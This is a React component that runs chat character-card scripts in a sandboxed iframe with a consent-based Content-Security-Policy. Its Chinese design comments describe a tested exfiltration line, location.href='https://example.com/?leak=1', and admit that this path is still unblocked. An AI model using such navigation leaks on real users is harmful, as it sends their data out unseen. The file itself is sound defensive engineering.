import Box from '@mui/material/Box';
import { useEffect, useRef } from 'react';
import { registerFrame } from '../runtime/host';
import { PREAMBLE, VENDOR } from '../runtime/preamble';

/**
 * 跑一段卡片程式的 iframe（M13 第二期）。
 *
 * 🔴 **`sandbox="allow-scripts"`，刻意不給 `allow-same-origin`**（Peter 2026-08-26 裁定）。
 * 這是本專案**唯一沒有照抄酒館助手**的一條：它的 iframe 完全沒有 `sandbox`
 * （`Iframe.vue:2-11`），於是卡片程式與主頁同源、權限等同整個頁面。
 * 我們把它關進獨立來源的沙箱裡：
 *   · 讀不到主頁的 DOM、cookie、`localStorage`
 *   · `window.parent` 是跨來源，屬性讀不到
 *   · 要跟主頁講話只能走 `postMessage`，而主頁只認我們自己開的那幾支 API
 * ⚠️ **代價是相容性**：真的需要直接操作主頁的卡片會壞。這條寫在驗收單第一排。
 *
 * 🔴 **沙箱擋的是「讀我們的東西」，不擋「往外送」**（驗收單 ⓪）。
 * ⇒ `allow` 是**使用者在同意視窗看過、而且按了同意**的網域清單，
 * 我們把它變成 iframe 內的 CSP —— 在此之前那份同意只是一筆記錄，不擋任何東西。
 * ⚠️ **CSP 管不到「iframe 把自己導航走」**（`location.href = 'https://…'`）。
 *    🔴 **2026-08-26 實機測過，不是推論**：塞一段 `location.href='https://example.com/?leak=1'`
 *    進去，iframe 真的整個換成那一頁。⇒ **這條沒擋住**，要靠主頁的 `frame-src`
 *    （驗收單的方案「丙」，還沒做）。**不要宣稱已經擋住。**
 *
 * 🔴 **`type="module"` 不可省。** 卡片的 MVU 那支全文就是
 * `import 'https://…/bundle.js'` —— 沒有 module 型別，`import` 直接是語法錯誤。
 *
 * ⚠️ **高度**：卡片自己會長高，iframe 不會跟著 ⇒ 內部量完 `scrollHeight` 回報，
 * 這邊照著調（酒館助手也是這樣做的 `adjust_iframe_height`）。
 */

/**
 * 只允許已同意的來源。
 * ⚠️ `'unsafe-inline'` / `'unsafe-eval'` 是**必要的**：卡片的介面靠 15 個 `onclick=`
 * 與內嵌 `<script>` 在跑。安全邊界是**沙箱那道獨立來源**，不是 `script-src` ——
 * 這裡守的是「資料往哪裡去」，不是「哪些程式能跑」。
 */
export function policyOf(allow: string[]): string {
  const hosts = [...new Set(allow)]
    .filter((h) => /^[\w.-]+(:\d+)?$/.test(h))
    .map((h) => `https://${h}`)
    .join(' ');
  const src = hosts === '' ? "'none'" : hosts;
  return [
    "default-src 'none'",
    `script-src 'unsafe-inline' 'unsafe-eval' ${src}`,
    `connect-src ${src}`,
    `img-src data: blob: ${src}`,
    `media-src data: blob: ${src}`,
    `font-src data: ${src}`,
    `style-src 'unsafe-inline' ${src}`,
    "form-action 'none'",
    "base-uri 'none'",
  ].join('; ');
}

export function ScriptFrame({
  code,
  name,
  allow,
  visible = false,
}: {
  code: string;
  name: string;
  /** 🔴 使用者同意過的外連網域。空陣列 ＝ 完全斷網（連我們的 vendor 都不給）。 */
  allow: string[];
  /** 隱藏的（角色腳本）vs 看得見的（訊息裡的介面）。 */
  visible?: boolean;
}) {
  const ref = useRef<HTMLIFrameElement | null>(null);

  /**
   * 🔴 **向 host 登記自己。** 沙箱是 opaque origin ⇒ 主頁那端無法用 `e.origin` 分辨來源，
   * 只能比對 `contentWindow` 的物件 identity。沒登記 ＝ 這個 frame 講的話全部被忽略。
   */
  useEffect(() => registerFrame(ref.current?.contentWindow), []);

  useEffect(() => {
    if (!visible) return;
    const onMsg = (e: MessageEvent) => {
      const d = e.data as { __vellumHeight?: number; name?: string } | null;
      if (!d?.__vellumHeight || d.name !== name || !ref.current) return;
      // 上限只是防呆：卡片算錯高度時不要讓頁面變成一公里長。
      ref.current.style.height = `${Math.min(d.__vellumHeight, 4000)}px`;
    };
    window.addEventListener('message', onMsg);
    return () => window.removeEventListener('message', onMsg);
  }, [name, visible]);

  const vendors = VENDOR.map((u) => `<script src="${u}"></script>`).join('');
  const measure = visible
    ? `<script>(function(){var s=function(){parent.postMessage({__vellumHeight:document.documentElement.scrollHeight,name:${JSON.stringify(
        name,
      )}},'*')};new ResizeObserver(s).observe(document.documentElement);addEventListener('load',s);s()})()</script>`
    : '';
  // 卡片的前端區塊本身就是一份完整 document；角色腳本則是純 JS，要自己包 <script>。
  const body =
    code.includes('<body') || code.includes('<html')
      ? code
      : `<script type="module">${code}</script>`;
  // 🔴 CSP 的 <meta> 必須排在所有 <script> 之前，否則對它們不生效。
  const srcDoc =
    `<!doctype html><html><head><meta charset="utf-8">` +
    `<meta http-equiv="Content-Security-Policy" content="${policyOf(allow)}">` +
    `${vendors}<script>${PREAMBLE}</script></head>` +
    `<body style="margin:0">${body}${measure}</body></html>`;

  return (
    <Box
      component="iframe"
      ref={ref}
      name={name}
      title={name}
      sandbox="allow-scripts"
      srcDoc={srcDoc}
      sx={
        visible
          ? {
              width: '100%',
              border: 0,
              height: 320,
              display: 'block',
              my: 1,
              colorScheme: 'normal',
            }
          : { display: 'none', width: 0, height: 0, border: 0 }
      }
    />
  );
}
